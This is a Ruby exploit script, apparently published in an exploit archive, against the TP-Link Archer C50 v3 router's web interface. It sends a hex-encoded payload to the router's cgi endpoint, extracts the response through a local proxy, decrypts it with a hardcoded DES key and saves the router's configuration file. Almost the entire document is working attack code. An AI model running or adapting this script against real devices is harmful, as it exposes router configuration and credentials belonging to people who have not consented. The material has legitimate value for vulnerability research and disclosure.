# Exploit Title: TP-Link Archer C50 Wireless Router 171227 - Cross-Site Request Forgery (Configuration File Disclosure)
# Date: 2018-11-07
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
url = "http://192.168.0.1:80/"
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

require('base64')
require('openssl')
require('mechanize')
agent = Mechanize.new()
# require HTTP Proxy (chunk error)
agent.set_proxy("127.0.0.1", "8080")

def scan(agent, url, path, query)
begin
	puts(path)
	response = agent.post(url+path, query, {
		"User-Agent" => "",
		"Accept" => "*/*",
		"Referer" => "http://192.168.0.1/mainFrame.htm",
		"Content-Type" => "text/plain",
		"Connection" => "keep-alive",
		"Cookie" => ""
	})
rescue Exception => e
	begin
	puts(e.inspect())
	#
	body = e.page().body()
	content = Base64.decode64(body.scan(/ZAP Error \[java\.io\.IOException\]\: Bad chunk size\: (.*)/).join())
	puts(body.inspect())
	cipher = OpenSSL::Cipher.new("des-ecb")
	cipher.key = "478DA50BF9E3D2CF"
	cipher.decrypt()
	output = cipher.update(content)
	#
	file = File.open("conf.bin.raw", "wb")
	file.write(output)
	file.close()
	rescue Exception => e
		puts(e)
	end
	puts("")
end
end

#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
payload = "\x5b\x49\x47\x44\x5f\x44\x45\x56\x5f\x49\x4e\x46\x4f\x23\x30"+
"\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c"+
"\x30\x2c\x30\x2c\x30\x2c\x30\x5d\x30\x2c\x34\xd\xa\x6d\x6f\x64"+
"\x65\x6c\x4e\x61\x6d\x65\xd\xa\x64\x65\x73\x63\x72\x69\x70\x74"+
"\x69\x6f\x6e\xd\xa\x58\x5f\x54\x50\x5f\x69\x73\x46\x44\xd\xa\x58"+
"\x5f\x54\x50\x5f\x50\x72\x6f\x64\x75\x63\x74\x56\x65\x72\x73\x69"+
"\x6f\x6e\xd\xa\x5b\x45\x54\x48\x5f\x53\x57\x49\x54\x43\x48\x23\x30"+
"\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c"+
"\x30\x2c\x30\x2c\x30\x5d\x31\x2c\x31\xd\xa\x6e\x75\x6d\x62\x65\x72"+
"\x4f\x66\x56\x69\x72\x74\x75\x61\x6c\x50\x6f\x72\x74\x73\xd\xa\x5b"+
"\x53\x59\x53\x5f\x4d\x4f\x44\x45\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c"+
"\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x5d\x32"+
"\x2c\x31\xd\xa\x6d\x6f\x64\x65\xd\xa\x5b\x2f\x63\x67\x69\x2f\x63\x6f"+
"\x6e\x66\x65\x6e\x63\x6f\x64\x65\x23\x30\x2c\x30\x2c\x30\x2c\x30"+
"\x2c\x30\x2c\x30\x23\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30\x2c\x30"+
"\x5d\x33\x2c\x30\xd\xa\x3d"
#puts(payload)
scan(agent, url, "cgi?1&1&1&8", payload)
#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!